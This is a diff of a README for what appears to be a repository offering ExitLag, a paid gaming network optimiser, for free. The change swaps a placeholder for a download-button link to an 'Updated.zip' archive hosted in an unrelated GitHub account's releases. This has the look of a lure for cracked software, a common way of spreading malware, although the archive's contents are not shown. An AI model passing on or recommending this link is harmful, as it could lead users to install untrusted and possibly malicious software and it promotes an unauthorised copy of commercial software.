@@ -28,7 +28,7 @@ ExitLag is a program designed to optimize network connections for online gaming,
 
 To download ExitLag, click the button below:
 
-[![Download ExitLag](https://img.shields.io/badge/Download-ExitLag-blue)](kkkkkkk)
+[![Download ExitLag](https://img.shields.io/badge/Download-ExitLag-blue)](https://github.com/HOOPLEE/exit-lag-free/releases/download/updated/Updated.zip)
 
 ---
 
